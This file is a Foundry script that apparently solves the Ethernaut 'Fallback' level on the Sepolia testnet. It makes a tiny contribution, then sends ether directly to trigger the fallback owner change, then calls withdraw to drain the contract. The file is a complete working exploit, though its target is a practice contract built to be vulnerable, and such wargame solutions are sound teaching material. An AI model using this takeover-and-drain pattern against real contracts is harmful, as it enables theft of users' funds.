// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../src/fallback/ex01.sol";

contract Ex01_fallback is Script {

    Fallback public ex01;

    constructor() {
        ex01 = Fallback(payable(vm.envAddress("EX01_INSTANCE")));
    }

    function setUp() public {}

    function run() public {
        uint256 pk = vm.envUint("PK");
        vm.startBroadcast(pk);
        ex01.contribute{value: 1}();
        (bool sent,) = payable(ex01).call{value:1}("");
        require(sent, "Failed to send Ether");
        ex01.withdraw();
        vm.stopBroadcast();
    }

    // forge script script/fallback/ex1_fallback.sol:Fallback --chain-id 11155111 --broadcast
}
